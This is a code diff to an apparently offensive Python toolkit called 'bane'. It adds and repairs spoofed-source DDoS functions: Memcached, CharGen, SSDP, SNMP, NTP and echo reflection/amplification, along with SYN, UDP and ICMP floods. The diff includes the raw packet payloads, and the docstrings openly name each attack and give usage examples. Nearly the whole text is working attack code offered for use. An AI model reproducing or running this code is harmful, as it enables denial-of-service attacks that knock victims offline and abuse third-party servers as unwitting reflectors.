@@ -13,6 +13,7 @@ else:
     urllib2=urllib.request
     from kamene.all import *
 from struct import *
+from bane.iot import getip
 from bane.payloads import *
 from bane.proxer import *
 if os.path.isdir('/data/data/com.termux/')==True:
@@ -1649,18 +1650,7 @@ class sflood(threading.Thread):
         urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),target,par)
     leng=len(urd)
     urd=urd.encode('utf-8')
-    p=random.randint(1,5) 
-    if p==1:
-     ot=random.randint(1,9)
-    elif p==2:
-     ot=random.randint(11,126)
-    elif p==3:
-     ot=random.randint(128,171)
-    elif p==4:
-     ot=random.randint(173,191)
-    elif p==5:
-     ot=random.randint(193,223)
-    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
+    sip=getip()
     ips = socket.inet_aton(sip)
     ipd = socket.inet_aton(dip)
     iphv = (4 << 4) + 5
@@ -1783,18 +1773,7 @@ class udpsp(threading.Thread):
      msg+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
     if len(msg)>1400:
      msg=msg[0:1400]
-    p=random.randint(1,5) 
-    if p==1:
-     ot=random.randint(1,9)
-    elif p==2:
-     ot=random.randint(11,126)
-    elif p==3:
-     ot=random.randint(128,171)
-    elif p==4:
-     ot=random.randint(173,191)
-    elif p==5:
-     ot=random.randint(193,223)
-    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
+    sip=getip()
     packet = IP(ttl=random.randint(minttl,maxttl),src=sip, dst=target)/UDP(sport=random.randint(1024,65500),dport=port)/msg
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -1976,14 +1955,14 @@ class dampli(threading.Thread):
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
-    s.sendto(packet,(target,53))
+    s.sendto(packet,(ip,53))
     counter+=1
     if prints==True:
      print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
    except Exception as e:
     pass
     time.sleep(.1)
-def dnsamplif(u,p=80,dnslist=[],threads=100,q='ALL',interval=300,logs=True,returning=False):
+def dnsamplif(u,p=80,dnslist=[],threads=100,q='ANY',interval=300,logs=True,returning=False):
  '''
    this function is for DNS amplification attack using and list of DNS servers provided by the user.
 
@@ -2038,15 +2017,14 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ALL',interval=300,logs=True,retur
 class nampli(threading.Thread):
  def run(self):
   global counter
-  data='\x17\x00\x02\x2a'+'\x00'*4
   while (stop!=True):
    try:
     ip=random.choice(ntpl)
-    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=123)/Raw(load=data)
+    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=123)/Raw(load='\x17\x00\x02\x2a'+'\x00'*4)
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
-    s.sendto(packet,(target,123))
+    s.sendto(packet,(ip,123))
     counter+=1
     if prints==True:
      print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
@@ -2060,7 +2038,7 @@ def ntpamplif(u,p=80,ntplist=[],threads=100,interval=300,logs=True,returning=Fal
    it takes the following parameters:
 
    u: target IP
-   dnslist: your NTP servers list
+   ntplist: your NTP servers list
    threads: (set by default to: 100)
 
    exapmle:
@@ -2102,18 +2080,215 @@ def ntpamplif(u,p=80,ntplist=[],threads=100,interval=300,logs=True,returning=Fal
     break
   if returning==True:
     return counter
-class snampli(threading.Thread):
+class memampli(threading.Thread):
  def run(self):
   global counter
-  data= '\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'
   while (stop!=True):
    try:
-    ip=random.choice(snmpl)
-    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=161)/Raw(load=data)
+    ip=random.choice(meml)
+    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=11211)/Raw(load="\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
-    s.sendto(packet,(target,161))
+    s.sendto(packet,(ip,11211))
+    counter+=1
+    if prints==True:
+     print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
+   except Exception as e:
+    pass
+   time.sleep(.1)
+def memcacheamplif(u,p=80,memlist=[],threads=100,interval=300,logs=True,returning=False):
+ '''
+   this function is for Memcached amplification attack using and list of DNS servers provided by the user.
+
+   it takes the following parameters:
+
+   u: target IP
+   memlist: your Memcache servers list
+   threads: (set by default to: 100)
+
+   exapmle:
+
+   >>>a=['124.0.2.2','22.3.55.45',.........]
+   >>>bane.memcacheamplif('8.8.8.8',memlist=a)
+
+'''
+ global stop
+ stop=False
+ global prints
+ prints=logs
+ global target
+ target=u
+ global port
+ port=p
+ global meml
+ meml=memlist
+ wh=0
+ try:
+  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+  wh+=1
+ except socket.error as msg:
+  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
+ if wh>0:  
+  for x in range(threads):
+   memampli().start()
+  c=time.time()
+  while True:
+   if stop==True:
+     break
+   try:
+    time.sleep(.1)
+    if int(time.time()-c)==interval:
+     stop=True
+     break
+   except KeyboardInterrupt:
+    stop=True
+    break
+  if returning==True:
+    return counter
+class charampli(threading.Thread):
+ def run(self):
+  global counter
+  while (stop!=True):
+   try:
+    ip=random.choice(chargenl)
+    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=19)/random.choice(lis)
+    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    packet=bytes(packet)
+    s.sendto(packet,(ip,19))
+    counter+=1
+    if prints==True:
+     print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
+   except Exception as e:
+    pass
+   time.sleep(.1)
+def chargenamplif(u,p=80,chargenlist=[],threads=100,interval=300,logs=True,returning=False):
+ '''
+   this function is for CharGen amplification attack using and list of DNS servers provided by the user.
+
+   it takes the following parameters:
+
+   u: target IP
+   chargenlist: your CharGen servers list
+   threads: (set by default to: 100)
+
+   exapmle:
+
+   >>>a=['124.0.2.2','22.3.55.45',.........]
+   >>>bane.chargenamplif('8.8.8.8',ntplist=a)
+
+'''
+ global stop
+ stop=False
+ global prints
+ prints=logs
+ global target
+ target=u
+ global port
+ port=p
+ global chargenl
+ chargenl=chargenlist
+ wh=0
+ try:
+  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+  wh+=1
+ except socket.error as msg:
+  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
+ if wh>0:  
+  for x in range(threads):
+   charampli().start()
+  c=time.time()
+  while True:
+   if stop==True:
+     break
+   try:
+    time.sleep(.1)
+    if int(time.time()-c)==interval:
+     stop=True
+     break
+   except KeyboardInterrupt:
+    stop=True
+    break
+  if returning==True:
+    return counter
+class ssampli(threading.Thread):
+ def run(self):
+  global counter
+  while (stop!=True):
+   try:
+    ip=random.choice(ssdpl)
+    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=1900)/Raw(load='M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
+    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    packet=bytes(packet)
+    s.sendto(packet,(ip,1900))
+    counter+=1
+    if prints==True:
+     print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
+   except Exception as e:
+    pass
+   time.sleep(.1)
+def ssdpamplif(u,p=80,ssdplist=[],threads=100,interval=300,logs=True,returning=False):
+ '''
+   this function is for CharGen amplification attack using and list of DNS servers provided by the user.
+
+   it takes the following parameters:
+
+   u: target IP
+   ssdplist: your CharGen servers list
+   threads: (set by default to: 100)
+
+   exapmle:
+
+   >>>a=['124.0.2.2','22.3.55.45',.........]
+   >>>bane.ssdpamplif('8.8.8.8',ntplist=a)
+
+'''
+ global stop
+ stop=False
+ global prints
+ prints=logs
+ global target
+ target=u
+ global port
+ port=p
+ global ssdpl
+ ssdpl=ssdplist
+ wh=0
+ try:
+  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+  wh+=1
+ except socket.error as msg:
+  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
+ if wh>0:  
+  for x in range(threads):
+   ssampli().start()
+  c=time.time()
+  while True:
+   if stop==True:
+     break
+   try:
+    time.sleep(.1)
+    if int(time.time()-c)==interval:
+     stop=True
+     break
+   except KeyboardInterrupt:
+    stop=True
+    break
+  if returning==True:
+    return counter
+class snampli(threading.Thread):
+ def run(self):
+  global counter
+  while (stop!=True):
+   try:
+    ip=random.choice(snmpl)
+    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=161)/Raw(load='\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00')
+    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    packet=bytes(packet)
+    s.sendto(packet,(ip,161))
     counter+=1
     if prints==True:
      print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
@@ -2127,7 +2302,7 @@ def snmpamplif(u,p=80,snmplist=[],threads=100,interval=300,logs=True,returning=F
    it takes the following parameters:
 
    u: target IP
-   dnslist: your SNMP servers list
+   snmplist: your SNMP servers list
    threads: (set by default to: 100)
   
    exapmle:
@@ -2155,6 +2330,71 @@ def snmpamplif(u,p=80,snmplist=[],threads=100,interval=300,logs=True,returning=F
  if wh>0:  
   for x in range(threads):
    snampli().start()
+  c=time.time()
+  while True:
+   if stop==True:
+     break
+   try:
+    time.sleep(.1)
+    if int(time.time()-c)==interval:
+     stop=True
+     break
+   except KeyboardInterrupt:
+    stop=True
+    break
+  if returning==True:
+    return counter
+class pingst(threading.Thread):
+ def run(self):
+  global counter
+  while (stop!=True):
+   data=''
+   for x in range(random.randint(1*amp,3*amp)):
+    data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
+   if len(data)>1400:
+    data=data[0:1400]
+   try:
+    ip=random.choice(pingl)
+    packet=IP(src=target, dst=ip)/UDP(sport=port,dport=7)/Raw(load=data)
+    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    packet=bytes(packet)
+    s.sendto(packet,(ip,port))
+    counter+=1
+    if prints==True:
+     print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(counter,ip,len(data)))
+   except Exception as e:
+    pass
+   time.sleep(.1)
+def ping_ref(u,p=80,pinglist=[],ampli=15,threads=100,interval=300,logs=True,returning=True):
+ '''
+   this function is for ICMP flood with spoofed sources
+'''
+ global stop
+ stop=False
+ global prints
+ prints=logs
+ global target
+ target=u
+ global port
+ port=p
+ global amp
+ if ampli<1:
+  ampli=1
+ if ampli>15:
+  ampli=15
+ amp=ampli
+ global pingl
+ pingl=pinglist
+ wh=0
+ try:
+  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+  wh+=1
+ except socket.error as msg:
+  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
+ if wh>0:  
+  for x in range(threads):
+   pingst().start()
   c=time.time()
   while True:
    if stop==True:
@@ -2245,18 +2485,7 @@ class icmpst(threading.Thread):
    if len(data)>1400:
     data=data[0:1400]
    try:
-    p=random.randint(1,5) 
-    if p==1:
-     ot=random.randint(1,9)
-    elif p==2:
-     ot=random.randint(11,126)
-    elif p==3:
-     ot=random.randint(128,171)
-    elif p==4:
-     ot=random.randint(173,191)
-    elif p==5:
-     ot=random.randint(193,223)
-    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
+    sip=getip()
     packet=IP(ttl=random.randint(minttl,maxttl),src=sip,dst=target)/ICMP()/data
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -2318,18 +2547,7 @@ class blnu(threading.Thread):
   global counter
   while (stop!=True):
    try:
-    p=random.randint(1,5) 
-    if p==1:
-     ot=random.randint(1,9)
-    elif p==2:
-     ot=random.randint(11,126)
-    elif p==3:
-     ot=random.randint(128,171)
-    elif p==4:
-     ot=random.randint(173,191)
-    elif p==5:
-     ot=random.randint(193,223)
-    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
+    sip=getip()
     packet=IP(ttl=random.randint(minttl,maxttl),src=sip,dst=target)/ICMP(type=3,code=3)
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
